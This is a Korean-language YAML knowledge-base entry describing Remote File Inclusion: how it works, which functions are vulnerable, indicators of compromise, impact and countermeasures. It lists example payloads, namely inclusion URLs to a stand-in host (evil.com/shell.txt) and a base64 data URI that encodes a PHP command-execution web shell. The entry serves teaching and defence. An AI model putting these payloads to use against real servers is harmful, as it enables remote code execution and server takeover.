# GR Atom: Remote File Inclusion (RFI)
# Version: 1.0
# Created: 2025-01-29

identity:
  id: "ATK-SERVER-RFI-001"
  name: "Remote File Inclusion (RFI)"
  normalization:
    normalized_name: "remote file inclusion rfi external file execution"
    normalization_version: "1.0"
  aliases:
    - "원격 파일 포함"
    - "RFI"
    - "Remote File Include"
    - "원격 파일 삽입"

classification:
  domain: security
  type: technique
  is_infrastructure: false
  abstraction_level: 3
  gr_coordinates:
    layer: "L7"
    zone: "Z2"
    atom_tags: ["EXEC", "HTTP", "NETWORK", "PATH", "WEB"]

definition:
  what: |
    Remote File Inclusion(RFI)은 웹 애플리케이션이 외부 URL로부터 파일을
    동적으로 포함(include)하는 기능을 악용하여, 공격자가 제어하는 원격 서버의
    악성 파일을 대상 서버에서 실행시키는 공격이다.
  why: |
    RFI에 성공하면 원격 코드 실행(RCE)이 가능하여 서버를 완전히 장악할 수 있다.
    웹쉘 설치, 데이터베이스 접근, 내부 네트워크 침투의 발판이 된다.
    PHP의 include/require 함수가 외부 URL을 허용할 때 주로 발생한다.
  how: |
    1. 파일 포함 파라미터가 있는 URL 식별 (예: ?page=about.php)
    2. 외부 URL로 파라미터 변경 (예: ?page=http://evil.com/shell.txt)
    3. 공격자 서버에 악성 코드 파일 준비
    4. 대상 서버가 원격 파일을 가져와 실행
    5. 원격 코드 실행(RCE) 성공, 웹쉘 설치 등

relations:
  structural:
    is_a: ["TECH-CONCEPT-SERVER-ATTACK-001"]
  causal:
    enables:
      - "VUL-DATA-EXPOSURE-001"
      - "VUL-ACCESS-BROKEN-001"
  related:
    similar_to:
      - "ATK-SERVER-PATH-001"
  conditional:
    requires:
      - "TECH-PROTOCOL-HTTP-001"
  applicability:
    applies_to:
      - "INFRA-APP-WEBAPP-001"
      - "INFRA-APP-WAS-001"

properties:
  technical:
    vulnerable_functions:
      php:
        - "include()"
        - "include_once()"
        - "require()"
        - "require_once()"
      jsp:
        - "<jsp:include>"
      asp:
        - "Server.Execute()"
    prerequisites:
      - "allow_url_include = On (PHP)"
      - "allow_url_fopen = On (PHP)"
      - "사용자 입력이 파일 경로에 직접 사용"
    payloads:
      basic:
        - "http://evil.com/shell.txt"
        - "http://evil.com/shell.php"
      with_null_byte:
        - "http://evil.com/shell.txt%00"
      data_uri:
        - "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4="
    indicators_of_compromise:
      - "URL 파라미터에 http:// 또는 https:// 포함"
      - "외부 도메인으로의 비정상 요청"
      - "웹 서버 로그에 외부 파일 참조"
      - "알 수 없는 PHP/스크립트 파일 생성"
  security:
    impact:
      confidentiality: "CRITICAL - 서버 완전 장악 가능"
      integrity: "CRITICAL - 파일 변조, 웹쉘 설치"
      availability: "HIGH - 서버 파괴 가능"
    cvss_base: 9.8
    cwe_id: "CWE-98"
    mitre_attack:
      technique_id: "T1505.003"
      tactic: "Persistence"
  countermeasures:
    primary:
      - name: "allow_url_include 비활성화"
        effectiveness: "HIGH"
      - id: "DEF-PREVENT-INPUTVAL-001"
        name: "입력값 검증 (화이트리스트)"
        effectiveness: "HIGH"
    secondary:
      - name: "파일 경로 정규화"
        effectiveness: "HIGH"
      - name: "WAF 규칙 적용"
        effectiveness: "MEDIUM"
      - name: "최소 권한 실행 환경"
        effectiveness: "MEDIUM"

metadata:
  trust:
    source: official
    references:
      - "OWASP Remote File Inclusion"
      - "CWE-98: Improper Control of Filename for Include/Require Statement"
      - "MITRE ATT&CK T1505.003"
    confidence: 1.0
    verified:
      status: verified
      date: 2025-01-29
      by: "GR System"
  temporal:
    created: 2025-01-29
    modified: 2025-01-29
    revision: 1
  security:
    sensitivity: public
    weaponization_risk: high
  ai:
    embedding_text: |
      Remote File Inclusion(RFI)은 외부 URL의 악성 파일을 서버에서 실행시키는
      공격이다. PHP의 include/require 함수가 외부 URL을 허용할 때 발생하며,
      원격 코드 실행(RCE)으로 서버를 완전히 장악할 수 있다. Path Traversal/LFI와
      관련되며, allow_url_include 비활성화, 입력값 화이트리스트 검증으로 방어한다.
      CWE-98에 해당하며 CVSS 9.8의 매우 높은 위험도를 가진다.
    search_keywords:
      - "RFI"
      - "Remote File Inclusion"
      - "원격 파일 포함"
      - "파일 포함 취약점"
      - "include 취약점"
      - "원격 코드 실행"
    related_queries:
      - "RFI란?"
      - "RFI vs LFI 차이"
      - "Remote File Inclusion 방어 방법"
      - "PHP 파일 포함 취약점"
